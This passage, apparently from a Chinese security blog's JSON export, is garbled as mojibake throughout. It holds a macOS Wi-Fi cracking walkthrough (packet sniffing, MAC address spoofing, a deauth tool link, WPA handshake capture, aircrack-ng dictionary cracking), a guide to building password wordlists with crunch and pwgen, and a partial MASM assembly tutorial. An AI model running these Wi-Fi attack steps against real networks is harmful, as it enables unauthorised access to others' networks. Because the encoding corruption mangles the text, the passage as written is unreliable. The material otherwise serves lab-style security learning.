ä¸ºè¿è¡Œç½‘ç»œç›‘å¬çš„ä¸»æœºåªæ˜¯åœ¨è¢«åŠ¨çš„æ¥æ”¶å±€åŸŸç½‘ä¸­ä¼ è¾“çš„ä¿¡æ¯ï¼Œä¸ä¸»åŠ¨ä¸å…¶ä»–ä¸»æœºäº¤æ¢ä¿¡æ¯ï¼Œä¹Ÿæ²¡æœ‰ä¿®æ”¹åœ¨ç½‘ç»œä¸­ä¼ è¾“çš„æ•°æ®åŒ…ã€‚ airport Wireless Toolä½¿ç”¨æ˜¾ç¤ºåŸºæœ¬ä¿¡æ¯1airport -I æ‰«æå‘¨è¾¹æ— çº¿ç½‘ç»œ1airport -s ç¦ç”¨airportï¼Œå…³é—­wifi1networksetup -setairportpower airport off è®¾å¤‡åç§°å¯ä»¥æ˜¯airportï¼ŒEN0ï¼ŒEN1ç­‰ï¼Œå› Macç¡¬ä»¶å’ŒOS Xçš„ç‰ˆæœ¬ï¼Œå› æ­¤ï¼Œå¯èƒ½éœ€è¦æŒ‡å®šè®¾å¤‡ç«¯å£ï¼Œè€Œä¸æ˜¯â€™airportâ€™ï¼Œä¾‹å¦‚EN1 EN0æˆ–ï¼š 1networksetup -setairportpower en0 off æ£€æŸ¥ç«¯å£(ä»¥en0ä¸ºä¾‹å­ï¼Œå¯ä»¥æ›¿æ¢æˆå…¶ä»–çš„)1networksetup -getairportpower en0 å¯ç”¨ç«¯å£ï¼Œæ‰“å¼€wifi1networksetup -setairportpower en0 on æ‰«æ1airport en0 scan å¯ä»¥ä½¿ç”¨grepè¿›è¡Œè¿‡æ»¤ï¼Œå¦‚ 12airport en0 scan |grep WEPairport en0 scan |grep WPA ç›‘å¬1sudo airport en0 sniff 6 â€‹ en0æ˜¯æ‰€ä½¿ç”¨ç½‘å¡çš„åç§°ï¼Œsniffè¡¨ç¤ºæ¨¡å¼ï¼Œ6è¡¨ç¤ºä¿¡é“ Ctrl c åœæ­¢ç›‘å¬ Wiresharkåˆ†æåŒ… æ ¹æ®Macåœ°å€æŸ¥çœ‹å‚å•†http://www.atoolbox.net/Tool.php?Id=808 http://www.metools.info/other/o67.html https://mac.bmcx.com/d0:76:e7:ef:c3:41__mac/ åœ¨æ¼æ´ç½‘ç«™æŸ¥çœ‹å…¬å¼€çš„æ¼æ´ä¿¡æ¯Routerpwn.com MACåœ°å€ä¼ªè£…1sudo ifconfig en0 lladdr 00:00:00:00:00:00:01 Deauthæ”»å‡»https://github.com/0x0XDev/JamWiFi Jamwifiä¸‹è½½ï¼š é“¾æ¥: https://pan.baidu.com/s/180kUZjXXf6PS8C8ZtB2d6Q æå–ç : fcu4 å¤åˆ¶è¿™æ®µå†…å®¹åæ‰“å¼€ç™¾åº¦ç½‘ç›˜æ‰‹æœºAppï¼Œæ“ä½œæ›´æ–¹ä¾¿å“¦ æŠ“åŒ…æ— çº¿è¯Šæ–­å·¥å…· å¹¸è¿çš„æ˜¯ï¼ŒOSX é…å¤‡äº†ä¸€å¥—æ— çº¿è¯Šæ–­å·¥å…·ã€‚ è¦æ‰“å¼€å®ƒä»¬ï¼Œè¯·åœ¨æŒ‰ä½é”®ç›˜ä¸Š option é”®çš„åŒæ—¶ï¼Œç‚¹å‡»èœå•æ ä¸­çš„ Wi-Fi å›¾æ ‡ã€‚ ç„¶åé€‰æ‹©â€œæ‰“å¼€æ— çº¿è¯Šæ–­â€¦â€ æµ‹å®šç›®æ ‡ç½‘ç»œä¿¡é“ æ‰“å¼€æ— çº¿è¯Šæ–­ç¨‹åºï¼Œå•å‡»çª—å£ &gt; æ‰«æã€‚ æ‰¾åˆ°ç›®æ ‡ç½‘ç»œï¼Œè®°å½•ä¸‹å…¶ä¿¡é“å’Œå®½åº¦ã€‚ æŠ“å–ä¸€ä¸ª 4-way handshake åœ¨æ— çº¿è¯Šæ–­ç¨‹åºæ‰“å¼€çš„æƒ…å†µä¸‹ï¼Œç‚¹å‡»èœå•æ ä¸­çš„çª—å£ &gt; å—…æ¢å™¨ã€‚é€‰æ‹©ä½ åœ¨ä¸Šä¸€æ­¥ä¸­æ‰¾åˆ°çš„ä¿¡é“å’Œå®½åº¦ã€‚ ç°åœ¨ï¼Œä½ éœ€è¦ç­‰å¾…æœ‰è®¾å¤‡è¿æ¥åˆ°ç›®æ ‡ç½‘ç»œã€‚å¦‚æœä½ æ­£åœ¨è‡ªå·±çš„ç½‘ç»œä¸Šæµ‹è¯•ï¼ˆä½¿ç”¨è€…åº”å½“åªåœ¨è‡ªå·±çš„ç½‘ç»œä¸Šè¿›è¡Œæµ‹è¯•ï¼‰ï¼Œå°†ä»»æ„ä¸€ä¸ªæ— çº¿è®¾å¤‡é‡æ–°è¿æ¥å°±å¯ä»¥æŠ“å– handshakeã€‚ å½“ä½ æ„Ÿè§‰å·²ç»æˆåŠŸæŠ“å– handshake æ—¶ï¼Œç‚¹å‡»åœæ­¢ã€‚ æ ¹æ®ä½ çš„æ“ä½œç³»ç»Ÿç‰ˆæœ¬ï¼ŒæŠ“å–çš„ .wcap æ–‡ä»¶å°†è¢«ä¿å­˜åˆ°æ¡Œé¢æˆ–/var/tmp/ã€‚ å°†æŠ“å–çš„æ–‡ä»¶ä¸Šä¼ åˆ° https://hashcat.net/cap2hccapx/ å°±å¯ä»¥å°†å…¶è½¬æ¢ä¸º .hccapx æ–‡ä»¶ã€‚ å¦‚æœä½ æˆåŠŸçš„æŠ“åˆ°äº† handshake ï¼Œç«™ç‚¹å°†å¼€å§‹ä¸‹è½½ä¸€ä¸ª.hccapxæ–‡ä»¶ã€‚ å¦åˆ™å°†ä¸ä¼šæç¤ºä¸‹è½½ã€‚ ç ´è§£1aircrack-ng -w /Users/gryffinbit/Downloads/rockyou.txt /tmp/airportSniffbW3DzV.cap -wè¡¨ç¤ºä½¿ç”¨å­—å…¸ï¼Œ&#x2F;Users&#x2F;gryffinbit&#x2F;Downloads&#x2F;rockyou.txtæ˜¯å­—å…¸æ‰€åœ¨çš„è·¯å¾„ï¼ŒairportSniffbW3DzV.capæ˜¯åˆšæ‰ç›‘å¬ç”Ÿæˆçš„æ–‡ä»¶ã€‚æ‰§è¡Œåä¼šåˆ†æè¿™ä¸ªæ–‡ä»¶ï¼Œæœ€åä¼šè¯¢é—®ä½ å¾—ç›®æ ‡ç½‘ç»œæ˜¯å“ªä¸ªã€‚ 1aircrack-ng -w dic.txt -M 100 -f 80 -1 -a 2 -b **:**:**:**:**:** /tmp/airportSniffbW3DzV.cap 1aircrack-ng -w /Users/gryffinbit/Documents/æ”»å‡»åŒ…/naive-hashcat/dicts/rockyou.txt -M 100 -f 80 -1 -a 2 -b 40:B0:76:53:31:F8 /Users/gryffinbit/Desktop/Gryffinbitâ€™s\\ MacBook\\ Pro_ch11_2021-05-04_10.43.18.435.pcap -w æŒ‡å®šå­—å…¸æ–‡ä»¶ -M æŒ‡å®šæœ€å¤§IVsï¼Œæ ¹æ®æç¤ºå¯ä»¥é€‚å½“è°ƒå¤§æ¬¡å‚æ•° -f æš´åŠ›ç ´è§£å› å­ï¼Œé»˜è®¤2ï¼Œä¹Ÿå¯é€‚å½“è°ƒå¤§ -a åŠ å¯†ç±»å‹ï¼Œ1:WEP, 2:WPA-PSK -b BSSIDï¼Œåˆšåˆšçºªå½•ç›®æ ‡Wi-Fiçš„Macåœ°å€ - åé¢ç´§è·Ÿä¹‹å‰è®°å½•çš„æ•è·æ•°æ®çš„å­˜å‚¨åœ°å€å³å¯ã€‚ æ›´å¤šå‚æ•°è¯´æ˜å¯ä»¥é€šè¿‡aircrack-ng --helpæŸ¥çœ‹ã€‚ åè®° kaliâ€‹ airmon-ngæ˜¯Aircrack-ngä¸­çš„ä¸€ä¸ªå·¥å…·ï¼Œä¸»è¦ç”¨æ¥è®¾ç½®ç›‘å¬æ¨¡å¼ã€‚åœ¨ç ´è§£æ— çº¿ç½‘ç»œæ—¶ï¼Œé€šå¸¸éƒ½æ˜¯ç”¨è¯¥å·¥å…·å°†æ— çº¿ç½‘å¡è®¾ç½®ä¸ºç›‘å¬æ¨¡å¼ã€‚è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1airmon-ng &lt;start|stop&gt; &lt;interface&gt; [channel] 1airmon-ng &lt;check&gt; [kill] å‚æ•°å«ä¹‰ï¼š å‚æ•° è¯´æ˜ start å¯åŠ¨ç›‘å¬æ¨¡å¼ stop åœæ­¢ç›‘å¬æ¨¡å¼ interface æŒ‡å®šè®¾ç½®ç›‘å¬æ¨¡å¼çš„æ¥å£ channel æŒ‡å®šæ— çº¿ç½‘ç»œçš„ä¿¡é“ check åˆ—å‡ºæ‰€æœ‰å¯èƒ½å¹²æ‰°æ— çº¿ç½‘å¡çš„ç¨‹åºã€‚ kill æ€æ­»æ‰€æœ‰å¯èƒ½å¹²æ‰°æ— çº¿ç½‘å¡çš„ç¨‹åºã€‚","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"æ— çº¿ç½‘ç»œå®‰å…¨","slug":"å®éªŒ/æ— çº¿ç½‘ç»œå®‰å…¨","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"},{"name":"macOS","slug":"macOS","permalink":"https://gryffinbit.top/tags/macOS/"}],"author":"Gryffinbit"},{"title":"WIFIå¯†ç ç ´è§£ä¹‹å¯†ç ç”Ÿæˆ","slug":"WIFIå¯†ç ç ´è§£ä¹‹å¯†ç ç”Ÿæˆ","date":"2021-05-03T11:09:54.000Z","updated":"2024-11-12T06:59:05.000Z","comments":true,"path":"2021/05/03/WIFIå¯†ç ç ´è§£ä¹‹å¯†ç ç”Ÿæˆ/","permalink":"https://gryffinbit.top/2021/05/03/WIFI%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E4%B9%8B%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90/","excerpt":"","text":"WIFIå¯†ç ç ´è§£ä¹‹å¯†ç ç”Ÿæˆæœ¬æ–‡å°†ä»‹ç»crunchä»¥åŠpwgenç”Ÿæˆå¯†ç å­—å…¸æ–¹æ³•ã€‚åˆ©ç”¨crunchã€pwgenå¯†ç ç”Ÿæˆå·¥å…·ï¼Œåˆ¶ä½œæœ‰é’ˆå¯¹æ€§çš„ç ´è§£å­—å…¸ï¼ŒåŠ å¿«ç ´è§£é€Ÿåº¦ã€‚ å®éªŒç¯å¢ƒmacOS Catalina 10.15.7 Kali é™„ä»¶ä¸‹è½½é“¾æ¥Rockyou.txt ä¸‹è½½é“¾æ¥ é“¾æ¥: https://pan.baidu.com/s/1syYEHrskSy6P9RPqM8wNvQ æå–ç : jvgc å¤åˆ¶è¿™æ®µå†…å®¹åæ‰“å¼€ç™¾åº¦ç½‘ç›˜æ‰‹æœºAppï¼Œæ“ä½œæ›´æ–¹ä¾¿å“¦ å…ˆä»‹ç»crunch crunchcrunchæ˜¯ä¸€æ¬¾å¯†ç å­—å…¸åˆ›å»ºå·¥å…·ï¼Œå¯ä»¥æŒ‰ç…§æŒ‡å®šçš„è§„åˆ™ç”Ÿæˆå¯†ç å­—å…¸ã€‚ä½¿ç”¨crunchå·¥å…·ç”Ÿæˆçš„å¯†ç å¯ä»¥è¾“å‡ºåˆ°å±å¹•ï¼Œä¿å­˜åˆ°æ–‡ä»¶æˆ–å¦ä¸€ä¸ªç¨‹åºä¸­ã€‚è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1crunch [min-len] [max-len] [character set] [options] é€‰é¡¹ è¯´æ˜ min-len ç”Ÿæˆå¯†ç å­—ç¬¦ä¸²çš„æœ€å°é•¿åº¦ã€‚ max-len ç”Ÿæˆå¯†ç å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ã€‚ character set æŒ‡å®šç”¨äºç”Ÿæˆå¯†ç çš„å­—ç¬¦é›†ã€‚crunchå·¥å…·é»˜è®¤æä¾›çš„å­—ç¬¦é›†ä¿å­˜åœ¨&#x2F;usr&#x2F;share&#x2F;crunch&#x2F;charset.lstä¸­ã€‚ç”¨æˆ·å¯ä»¥ç›´æ¥ä½¿ç”¨è¿™äº›å­—ç¬¦é›†æ¥ç”Ÿæˆå¯¹åº”çš„å¯†ç å­—å…¸ï¼Œä¹Ÿå¯ä»¥æ‰‹åŠ¨æŒ‡å®šå­—ç¬¦ä¸²ã€‚ Kali è·¯å¾„ï¼š&#x2F;usr&#x2F;share&#x2F;crunch&#x2F;charset.lst macOS è·¯å¾„ï¼š &#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;crunch&#x2F;3.6&#x2F;share&#x2F;charset.lst crunchå‘½ä»¤å‚æ•°ï¼š é€‰é¡¹ è¯´æ˜ -b æŒ‡å®šå†™å…¥æ–‡ä»¶æœ€å¤§çš„å­—èŠ‚æ•° ã€‚è¯¥å¤§å°å¯ä»¥æŒ‡å®šKBã€MBæˆ–GBï¼Œä½†æ˜¯å¿…é¡»ä¸-o STARTé€‰é¡¹ä¸€èµ·ä½¿ç”¨ã€‚ -c å¯†ç ä¸ªæ•°ã€‚ -d é™åˆ¶å‡ºç°è¿ç»­ç›¸åŒå…ƒç´ çš„ä¸ªæ•°ï¼Œæ¯”å¦‚-d 3å°±ä¸ä¼šå‡ºç°zzzzfã€‚ -f è°ƒç”¨å¯†ç åº“æ–‡ä»¶ -o æŒ‡å®šç”¨æ¥ä¿å­˜å¯†ç çš„æ–‡ä»¶åï¼Œä»¥åŠè·¯å¾„ -p å®šä¹‰å¯†ç å…ƒç´  -z æ‰“åŒ…å‹ç¼© -t å®šä¹‰ç‰¹æ®Šçš„è¾“å‡ºæ ¼å¼ï¼Œå…¶ä¸­@ä»£è¡¨å°å†™å­—æ¯ï¼Œ%ä»£è¡¨æ•°å­—ï¼Œ^ä»£è¡¨ç¬¦å· å®‰è£…12brew search crunchbrew install crunch ç”Ÿæˆå­—å…¸åœ¨ç»ˆç«¯è¾“å…¥crunchæ˜¾ç¤ºç”¨æ³• 1crunch &lt;min&gt; &lt;max&gt; [options] ç¤ºä¾‹åœ¨ç»ˆç«¯è¾“å…¥å‘½ä»¤â€œcrunch 2 7â€ï¼Œç”Ÿæˆæœ€å°2ä½ã€æœ€å¤§7ä½ã€ç”±26ä¸ªå°å†™å­—æ¯ä¸ºå…ƒç´ çš„æ‰€æœ‰ç»„åˆï¼Œå¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚æŒ‰ctrl+cå³å¯ç»ˆæ­¢ç”Ÿæˆã€‚ 1crunch 2 7 åœ¨ç»ˆç«¯è¾“å…¥å‘½ä»¤â€œcrunch 2 7 abcdef&#x2F;â€ï¼Œç”Ÿæˆæœ€å°2ä½ã€æœ€å¤§7ä½ã€ç”±abcdef&#x2F;ä¸ºå…ƒç´ çš„æ‰€æœ‰ç»„åˆã€‚ 1crunch 2 7 abcdef/ å¯†ç åº“æŸ¥çœ‹å¯†ç åº“1cat /usr/local/Cellar/crunch/3.6/share/charset.lst Kali : 1cat /usr/share/crunch charset.lst è°ƒç”¨å¯†ç åº“è°ƒç”¨å¯†ç åº“charset.lstï¼Œç”Ÿæˆæœ€å°ä¸º2ã€æœ€å¤§ä¸º7çš„ã€å…ƒç´ ä¸ºå¯†ç åº“charset.lstä¸­hex-lowerçš„é¡¹ç›®ï¼Œå¹¶ä¿å­˜ä¸ºpassword.txtã€‚(-oæŒ‡å®šè¾“å‡ºè·¯å¾„) 1crunch 2 7 -f /usr/local/Cellar/crunch/3.6/share/charset.lst hex-lower -o desktop/password.txt Kali è°ƒç”¨å¯†ç åº“charset.lstï¼Œç”Ÿæˆæœ€å°ä¸º1ã€æœ€å¤§ä¸º4çš„ã€å…ƒç´ ä¸ºå¯†ç åº“charset.lstä¸­hex-lowerçš„é¡¹ç›®ï¼Œå¹¶ä¿å­˜ä¸ºpassword.txtã€‚(-oæŒ‡å®šè¾“å‡ºè·¯å¾„) 1crunch 1 4 -f /usr/share/crunch charset.lst -o /root/password.txt ç”ŸæˆæŒ‡å®šå…ƒç´ å­—å…¸ ç”Ÿæˆä»¥â€œIâ€â€œloveâ€â€œyouâ€ä¸ºå…ƒç´ çš„æ‰€æœ‰å¯†ç ç»„åˆ 1crunch 2 3 -p I love you ç”Ÿæˆä»¥æœ€å°ä¸º1ä½ã€æœ€å¤§ä¸º3ä½ã€å…ƒç´ ä¸ºæ‰€æœ‰å°å†™å­—æ¯ï¼Œå…¶ä¸­æ¯ä¸€ä¸ªå­—å…¸æ–‡ä»¶åŒ…å«5000ä¸ªå¯†ç ï¼Œå¹¶å°†æ–‡ä»¶ä¿å­˜ä¸ºgzipæ–‡ä»¶ï¼Œæ–‡ä»¶åå°†ä»¥â€œç¬¬ä¸€ä¸ªå¯†ç â€+â€œ-â€+â€œæœ€åä¸€ä¸ªå¯†ç â€+â€œ.txt.gzâ€ä¿å­˜ 1crunch 1 3 -o START -c 5000 -z gzip (å½“å‰æ˜¯åœ¨desktopä¸‹è¿è¡Œï¼Œæ‰€ä»¥ç”Ÿæˆè·¯å¾„åœ¨desktop) ç”Ÿæˆæœ€å°ä¸º4ä½ã€æœ€å¤§ä¸º5ä½ã€å…ƒç´ ä¸ºæ‰€æœ‰å°å†™å­—æ¯çš„å¯†ç å­—å…¸ï¼Œå¹¶ä»¥10Mè¿›è¡Œåˆ†å‰²ï¼›è¿™æ—¶ä¼šç”Ÿæˆ8ä¸ªæ–‡ä»¶ã€‚ 1crunch 4 5 -b 10mib -o START ç”Ÿæˆ4ä½å¯†ç ã€‚å…¶ä¸­æ ¼å¼ä¸ºä¸¤ä¸ªæ•°å­—+ä¸€ä¸ªå°å†™å­—æ¯+å¸¸è§ç¬¦å· 1crunch 4 4 ++123+ -y %%@^ ç”Ÿæˆ3ä½å¯†ç ã€‚å…¶ä¸­ç¬¬ä¸€ä½ä¸ºabcä¸­çš„ä¸€ä¸ªï¼Œç¬¬äºŒä½ä¸º123ä¸­çš„ä¸€ä¸ªï¼Œç¬¬ä¸‰ä½ä¸º@#!ä¸­çš„ä¸€ä¸ª 1crunch 3 3 abc+123@#! -t @%^ ç”Ÿæˆ5ä¸ªå…ƒç´ ç»„æˆçš„å¯†ç ã€‚å…¶ä¸­å‰ä¸‰ä¸ªä¸ºI miss youçš„ä»»æ„ç»„åˆï¼Œåä¸¤ä¸ªä¸ºä¸¤ä¸ªå°å†™è‡ªå·±çš„ä»»æ„ç»„åˆã€‚ 1crunch 5 5 -t ddd@@ -p I love you ä»‹ç»pwgen pwgenä¸‹é¢ä»‹ç»å¦‚ä½•ä½¿ç”¨pwgenå·¥å…·æ„å»ºå¤æ‚å¯†ç ã€‚pwgenæ˜¯ä¸€æ¬¾å¯†ç ç”Ÿæˆå·¥å…·ï¼Œä½¿ç”¨è¯¥å·¥å…·ç”Ÿæˆçš„å¯†ç ç›¸å½“å®‰å…¨ã€‚ å…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1pwgen [option] [pw_length] [num_pw] pwgenå·¥å…·æ”¯æŒçš„é€‰é¡¹åŠå‚æ•°å«ä¹‰å¦‚ä¸‹ï¼š é€‰é¡¹ è¯´æ˜ -c ç”Ÿæˆçš„å¯†ç è‡³å°‘åŒ…å«ä¸€ä¸ªå¤§å†™å­—æ¯ -A ç”Ÿæˆçš„å¯†ç ä¸åŒ…å«å¤§å†™å­—æ¯ -n ç”Ÿæˆçš„å¯†ç è‡³å°‘åŒ…å«ä¸€ä¸ªæ•°å­— -0 ç”Ÿæˆçš„å¯†ç ä¸­ä¸åŒ…å«æ•°å­— -y ç”Ÿæˆçš„å¯†ç ä¸­è‡³å°‘åŒ…å«ä¸€ä¸ªç‰¹æ®Šç¬¦å· -s ç”Ÿæˆå®Œå…¨éšæœºå¯†ç  -B ç”Ÿæˆçš„å¯†ç ä¸åŒ…å«æ­§ä¹‰å­—ç¬¦ï¼Œå¦‚0ã€O -v ä¸è¦ä½¿ç”¨ä»»ä½•å…ƒéŸ³ -1 æŒ‰è¡Œæ˜¾ç¤ºå¯†ç  å®‰è£…1brew install pwgen ç”Ÿæˆå­—å…¸pwgenå·¥å…·ç”Ÿæˆä¸€ä¸ªé•¿åº¦ä¸º8ï¼Œå¹¶ä¸”å«æœ‰æ•°å­—ã€ä¸åŒ…å«å¤§å†™å­—æ¯ã€ä¸åŒ…å«æ­§ä¹‰å­—æ¯çš„4ä¸ªå¯†ç ã€‚ 1pwgen -nAB 8 4 pwgenå·¥å…·ç”Ÿæˆä¸€ä¸ªé•¿åº¦ä¸º17ï¼Œå¹¶ä¸”åŒ…å«å¤§å†™å­—æ¯ã€åŒ…å«æ•°å­—ã€åŒ…å«ç‰¹æ®Šç¬¦å·çš„5ä¸ªå¯†ç ï¼Œå¹¶æŒ‰è¡Œæ˜¾ç¤ºã€‚ 1pwgen -ncy1 17 5 ç”Ÿæˆé•¿åº¦ä¸º7çš„ï¼Œå«æœ‰æ•°å­—å’Œå¤§å°å†™å­—æ¯çš„4ä¸ªå¯†ç ã€‚ 1pwgen -ncC 7 4 åè®° Kaliä¸­è‡ªå¸¦äº†ä¸€äº›å¯†ç å­—å…¸ï¼Œå¯ä»¥å¸®åŠ©ç”¨æˆ·å®æ–½å¯†ç ç ´è§£ã€‚è‡ªå¸¦å¯†ç æ–‡ä»¶é»˜è®¤ä¿å­˜åœ¨&#x2F;usr&#x2F;share&#x2F;wordlistsç›®å½•ä¸­ã€‚è¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼ŒæŸ¥çœ‹é»˜è®¤è‡ªå¸¦å†…å®¹ 1ls /usr/share/wordlists macOS Rockyou.txt ä¸‹è½½é“¾æ¥ é“¾æ¥: https://pan.baidu.com/s/1syYEHrskSy6P9RPqM8wNvQ æå–ç : jvgc å¤åˆ¶è¿™æ®µå†…å®¹åæ‰“å¼€ç™¾åº¦ç½‘ç›˜æ‰‹æœºAppï¼Œæ“ä½œæ›´æ–¹ä¾¿å“¦","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"æ— çº¿ç½‘ç»œå®‰å…¨","slug":"å®éªŒ/æ— çº¿ç½‘ç»œå®‰å…¨","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"},{"name":"macOS","slug":"macOS","permalink":"https://gryffinbit.top/tags/macOS/"},{"name":"wifiç ´è§£","slug":"wifiç ´è§£","permalink":"https://gryffinbit.top/tags/wifi%E7%A0%B4%E8%A7%A3/"}],"author":"Gryffinbit"},{"title":"ç”¨æ±‡ç¼–å®ç°Cè¯­è¨€å‡½æ•°","slug":"ç”¨æ±‡ç¼–å®ç°Cè¯­è¨€å‡½æ•°","date":"2021-05-02T17:30:16.000Z","updated":"2024-11-12T06:59:55.000Z","comments":true,"path":"2021/05/03/ç”¨æ±‡ç¼–å®ç°Cè¯­è¨€å‡½æ•°/","permalink":"https://gryffinbit.top/2021/05/03/%E7%94%A8%E6%B1%87%E7%BC%96%E5%AE%9E%E7%8E%B0C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0/","excerpt":"","text":"ç”¨win32æ±‡ç¼–è¯­è¨€å®ç°ä»¥ä¸‹Cè¯­è¨€å‡½æ•°ï¼Œ strlen() strcmp() strchr() å®‰è£…MASMåœ¨å®˜ç½‘ä¸‹è½½https://www.masm32.com/ è§£å‹æ–‡ä»¶å¤¹åˆ°æŒ‡å®šç›˜ç¬¦ã€‚ é…ç½®MASMè·¯å¾„æ§åˆ¶é¢æ¿-&gt;ç³»ç»Ÿå’Œå®‰å…¨-&gt; ç³»ç»Ÿ -&gt; é«˜çº§ç³»ç»Ÿè®¾ç½® -&gt; ç¯å¢ƒå˜é‡ -&gt; ç³»ç»Ÿå˜é‡ å°†masmç›¸å…³è·¯å¾„æ·»åŠ åˆ°ç³»ç»Ÿå˜é‡ 12å˜é‡åï¼šincludeå˜é‡å€¼ï¼š%Masm32Dir%\\Include; 12å˜é‡åï¼šlibå˜é‡å€¼ï¼š%Masm32Dir%\\lib; 12å˜é‡åï¼šMasm32Dirå˜é‡å€¼ï¼š C:\\masm32 //å¡«å…¥è‡ªå·±çš„masmå®‰è£…è·¯å¾„ 12å˜é‡åï¼špathå˜é‡å€¼ï¼š%Masm32Dir%\\Bin;%Masm32Dir%;C:\\Users\\admin\\AppData\\Local\\Microsoft\\WindowsApps;C:\\masm32\\bin; ä»£ç strlen() strlen.asm 1234567891011121314151617181920212223242526272829303132333435363738.386.model flat, stdcallinclude kernel32.incincludelib kernel32.libinclude msvcrt.incincludelib msvcrt.lib.dataszText db &quot;Reverse Engineering&quot;, 0chr db &#x27;i&#x27;format db &quot;%d&quot;, 0AH, 0.codemain PROC LEA EDI, szText MOV ECX,0FFFFFFFFH ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ;strlené€»è¾‘ MOV EAX,0 ;è®¡æ•° count: ;æ­¤è¿‡ç¨‹ä½“ç”¨äºè®¡é‡å­—ç¬¦æ•°ç›® CMP BYTE PTR [EDI],0 ;å°†æ¯ä¸€ä¸ªå­—ç¬¦ä¸å­—ç¬¦ä¸²ç»“æŸç¬¦&#x27;\\0&#x27;æ¯”è¾ƒ PUSHFD ;å°†çŠ¶æ€æ ‡å¿—ä½å…¥æ ˆ ADD EDI,1 ;å¢åŠ å­—ç¬¦ä¸²ç´¢å¼• INC EAX ;ä¸ç®¡ä¸‰ä¸ƒäºŒåä¸€ï¼Œå…ˆç»™è®¡æ•°å€¼+1 POPFD ;å°†çŠ¶æ€æ ‡å¿—ä½å‡ºæ ˆ LOOPNZ count ;è‹¥æ­¤å­—ç¬¦ä¸ç­‰äº&#x27;\\0&#x27;ï¼Œåˆ™è·³è½¬å›countç»§ç»­è®¡æ•° DEC EAX ;ç”±äºæœ€åå°†å­—ç¬¦=&#x27;\\0&#x27;çš„æƒ…å†µä¹Ÿè®¡æ•°äº†ï¼Œæ‰€ä»¥éœ€è¦ç»™è®¡æ•°å€¼-1 INVOKE crt_printf,addr format,EAX ;è¿™é‡Œè°ƒç”¨è¿‡ç¨‹æŠŠè®¡æ•°å€¼æ‰“å°å‡ºæ¥ï¼Œperfecct! ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; INVOKE crt_getchar INVOKE ExitProcess, 0main ENDPEND main strchr() strchr.asm 12345678910111213141516171819202122232425262728293031323334353637383940414243.386.model flat, stdcallinclude kernel32.incincludelib kernel32.libinclude msvcrt.incincludelib msvcrt.lib.dataszText db &quot;Reverse Engineering&quot;, 0chr db &#x27;i&#x27;format db &quot;%d&quot;, 0AH, 0.codemain PROC LEA EDI, szText MOV ECX,0FFFFFFFFH ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ;strchré€»è¾‘ ;1.é¢˜ç›®è¦æ±‚è¿”å›ä½ç½®æŒ‡é’ˆï¼Œä½†æ˜¯æ‰“å°æŒ‡é’ˆå¯¹äºåˆ¤æ–­å‡†ç¡®æ€§å¹¶ä¸ç›´è§‚ã€‚æˆ‘é€‰ç”¨æ•°ç»„ä¸‹æ ‡ä»£æ›¿ ;2.ç”±äºè¦æ±‚åœ¨æœªæ‰¾åˆ°æ—¶è¿”å›é›¶ï¼Œæ•…è€Œè¿™é‡Œæ•°ç»„ä¸‹æ ‡çš„åˆå§‹å€¼æ˜¯ä¸€ MOV AH,1 ;AHç”¨äºå­˜å‚¨æ•°ç»„ä¸‹æ ‡ï¼Œä»ä¸€å¼€å§‹stringLocate: ;å­—ç¬¦ä¸²å®šä½è¿‡ç¨‹ MOV AL,[EDI] ;å°†å­—ç¬¦ä¸²çš„å­—ç¬¦å€¼é€å…¥ALå¯„å­˜å™¨ CMP AL,chr ;æŠŠALä¸å¾…æŸ¥æ‰¾å­—ç¬¦æ¯”è¾ƒ JE print ;å¦‚æœç›¸ç­‰ï¼Œæ‰¾åˆ°äº†ï¼Œè·³è½¬åˆ°æ‰“å°è¿‡ç¨‹ CMP AL,0 ;ALä¸å¾…æŸ¥æ‰¾å­—ç¬¦ä¸æƒ³ç­‰ï¼Œåˆ™ä¸ç»ˆæ­¢ç¬¦æ¯”è¾ƒï¼Œæ˜¯å¦åˆ°äº†å­—ç¬¦ä¸²æœ«å°¾ï¼Ÿ JE NotFound ;åˆ°è¾¾å­—ç¬¦ä¸²æœ«å°¾ï¼Œæœªæ‰¾åˆ°å¾…æŸ¥æ‰¾å­—ç¬¦ï¼Œè·³è½¬åˆ°â€œæœªå‘ç°â€ ADD EDI,1 ;å­—ç¬¦ä¸²ç´¢å¼•å€¼+1 INC AH ;æ•°ç»„ä¸‹æ ‡è®¡æ•°+1 JMP stringLocate ;ç»§ç»­æŸ¥æ‰¾ NotFound: MOV AH,0 ;å°†æ•°ç»„ä¸‹æ ‡å€¼ç½®é›¶ï¼Œè¡¨ç¤ºæœªæ‰¾åˆ° print: INVOKE crt_printf,addr format,AH ;æ‰“å° ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; INVOKE crt_getchar INVOKE ExitProcess, 0main ENDPEND main strcmp() Strcmp.asm 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556.386.model flat, stdcallinclude kernel32.incincludelib kernel32.libinclude msvcrt.incincludelib msvcrt.lib.dataformat db &quot;%d&quot;, 0AH, 0szText db &quot;Reverse Engineering&quot;, 0szText2 db 